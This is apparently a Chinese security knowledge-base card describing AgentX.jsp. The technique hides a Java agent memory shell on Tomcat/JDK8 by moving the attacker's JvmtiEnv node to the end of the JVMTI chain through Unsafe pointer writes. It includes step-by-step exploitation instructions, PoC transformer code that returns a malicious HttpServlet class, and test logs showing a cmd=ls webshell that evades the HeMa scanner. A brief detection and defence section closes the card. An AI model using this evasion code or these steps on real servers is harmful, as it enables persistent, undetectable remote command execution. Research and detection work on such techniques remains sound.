---
id: web-java-classloader-agent-jvmtienv-tail-move-evade-detection
title: jvmtiEnv 链末尾自移动 + 无限环终止：让防护 Agent 永远看不到被修改字节码（AgentX.jsp）
type: scenario
domain: web
path: web/java/classloader
technique: java-agent-jvmtienv-tail-move-evasion
tags:
- java
- agent
- memshell
- jvmti
- evasion
- detection-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V642
  verified_at: '2026-11-13T02:40:47+08:00'
  notes: 已对照原文 12556 全文与 49 张图核对：Hack.clearFlag 链尾自移动/环终止代码与原文一致（content.md 475-522 行），AgentX.jsp 实测日志（图47：own jvmtienvEnv no longer the last one…、infinite loop…、set next → 0x0、will hack HttpServlet）、河马扫描结果（未注入 0、NoAgent 1、AgentX 0）与 cmd=ls 仍可执行（图47/48）均与卡片一致。链操作机制（前驱摘除→接链尾→环→下一轮置空）复算成立。与链序/缓存卡为理论+实现关系，保留。未实测运行 PoC。
url: /docs/web/java/classloader/web-java-classloader-agent-jvmtienv-tail-move-evade-detection/
draft: false
kb_aliases:
- AgentX.jsp
- jvmtiEnv 移到链尾
- 规避 Agent 内存马检测
- 无限环终止 transformer
- 河马查杀绕过
---

## 一句话结论

防护 Agent 能否看到攻击修改，取决于双方 `JvmtiEnv` 节点在检测时的先后；攻击者的 transformer 每次执行时检查自己的节点是否已是链尾，若不是就先把自己摘下、接到链尾，并用“下一轮终止”标志把链临时闭成环再断开，保证自己永远最后执行——这样即使防御方的检测 Agent 在攻击后加载，其 `transform` 也只能拿到攻击前字节码，`HttpServlet` 内存马对基于 Agent 的查杀（如河马）不可见。

## 原理

- `JvmtiEnvBase::_head_environment` 是单链表；类转换按链上节点顺序执行各 transformer。攻击者后追加节点时自然在链尾；但防御方后续加载（临时检测模式）会把自己追加到链尾，从而在攻击者之后执行并看到修改。
- 解法：攻击者的 `transform` 每次被调用时，先读自己的 `_next`：
  - 若 `_next != 0`，说明后面还有节点。把前驱的 `_next` 指向自己的 `_next`（从链中摘除自己），再找到原链尾并把 `_next` 指向自己（接到链尾）。此时链形成“自己指向链尾、链尾又指向自己”的环？为安全结束本次遍历，需让下一轮把 `_next` 置 0。
  - 实现上用 `clearFlag`：第一次调整后置 `clearFlag=true` 并返回 `null`（本次不转换）；下一轮 `transform` 再次进入时把 `ownEnv._next=0` 结束链，然后正常返回恶意字节码。
- 为什么能绕过：防护方 `transform` 的返回值决定它能“看到什么”。防御节点在攻击节点之前执行时，拿到的 `classfileBuffer` 是攻击前版本；攻击者的修改在链尾最后生效。检测方只能观察到“类被重载”，dump 出来的 `HttpServlet` 仍是正常的（`/tmp/T.bb40.class` 与正常类一致）。
- 该手法要求攻击者已能拿到自己的 `JvmtiEnv` 地址（自建或复用），并能在 Java 层读写 JVM 内部指针（Unsafe）。JDK8 下可行；高版本受模块封装/内存访问限制。
- 原文以 AgentX.jsp 在 Tomcat9 实测：注入后 `cmd=ls`/`whoami` 正常执行，河马扫描（未注入 0、NoAgent 注入后 1、AgentX 注入后仍 0）无法发现。

## 触发条件

- JDK8 系 JVM，攻击者已具备自建/复用 `Instrumentation` 与读取自身 `JvmtiEnv` 指针的能力；
- 能在 Java 代码中执行 Unsafe 内存读写（JSP/反序列化入口）；
- 防御方采用“事后 Attach 检测 Agent/内存马扫描”模式（防护模式提前加载的场景下链序仍适用，但防护方可能监控重载事件）。

## 利用步骤

1. 注入 AgentX.jsp，自建 `JPLISAgent` 并记录自身 `JvmtiEnv` 地址（`ownJvmtiEnvAddr`）。
2. 注册自定义 transform 逻辑（可与“替换 mTransform”卡组合），在每次转换时执行链尾检查。
3. 若自身不在链尾：找到前驱节点，将其 `_next` 改为自己的 `_next`；找到原链尾，把链尾 `_next` 指向自己；置 `clearFlag=true`，本次返回 `null`。
4. 下一轮进入时 `ownEnv._next=0` 断开环，正常返回恶意字节码完成改写。
5. 之后任意时刻防御方扫描，其 transform 先执行、看到的是正常字节码；内存马保持有效。

## PoC

核心逻辑（原文节选）：

```java
class Hack {
    private boolean clearFlag = false;
    private byte[] r(Object loader, Object classname, Object classBeingRedefined,
                     Object protectionDomain, byte[] classfileBuffer, boolean isRetransformer) {
        if (clearFlag) { // 结束链
            AgentX.setTheNextJvmti(AgentX.ownJvmtiEnvAddr, 0);
            clearFlag = false;
        }
        if (!"com/rzte/agentcrack/T".equals(classname)) return null;
        if (!clearFlag) {
            long nextJvmti = AgentX.getTheNextOfJvmtiEnv(AgentX.ownJvmtiEnvAddr);
            if (nextJvmti != 0) {
                long jvmtiPointer = AgentX.findTheJvmtiPointer(AgentX.ownJvmtiEnvAddr);
                if (jvmtiPointer == 0) return null;
                AgentX.putLong(jvmtiPointer, nextJvmti);           // 摘除自己
                long lastJvmti = AgentX.findTheLastJvmtiEnv();
                AgentX.setTheNextJvmti(lastJvmti, AgentX.ownJvmtiEnvAddr); // 接到链尾
                clearFlag = true;
                return null;
            }
        }
        return Base64.getDecoder().decode(EVIL_CLASS_B64);
    }
}
```

实测输出：

```text
own jvmtienvEnv no longer the last one, set it to the end.
now the jvmtiEnv chain is an infinite loop and needs to be terminated the next time it runs.
... (下一轮) set the next of jvmtiEnv 0x7fdd98320c20 -> 0x0
will hack the class: javax/servlet/http/HttpServlet
```

河马扫描对比：未注入 0；NoAgent.jsp 注入后 1（检测到）；AgentX.jsp 注入后 0（未检测到），且 `?cmd=ls` 仍可执行。

## 变体与关联

- 变体：不做链尾移动，改为在检测后由守护线程定期检查修改是否被回滚，被回滚则重新注入。
- 变体：结合“替换 mTransform”卡，链上完全没有 `ClassFileTransformer` 实现，进一步减少特征。
- 关联：[[web-java-classloader-agent-jvmtienv-chain-order-cached-classfile]]——链序/缓存的理论基础。
- 关联：[[web-java-classloader-agent-self-build-jplisagent-java-vm-method-parse]]——获得自身 JvmtiEnv 的前置能力。
- 关联：[[web-java-classloader-agent-replace-jplisagent-transform-custom-method]]——自定义 transform 实现。
- 关联：[[defense-detection-arthas-agent-memshell-detect-remove]]——被该手法针对的查杀方式。

## 检测与防御

- 检测：解析 `JvmtiEnvBase::_head_environment` 链的节点数量/顺序是否与已知 Agent 一致，检测异常的自环/临时断链；监控 `_next` 的非预期修改。
- 检测：不能只看 transformer 返回的字节码；应比对当前 `InstanceKlass` 与 `_cached_class_file` 差异，并对 `HttpServlet` 等容器类做基线校验（行为/字节码双重）。
- 防御：Agent 链完整性校验、内核/进程级监控 Unsafe 内存写；高版本 JDK 模块封装提高门槛。
- 提示：任何依赖“在攻击者之后加载检测 Agent”的查杀都可被链尾自移动绕过。
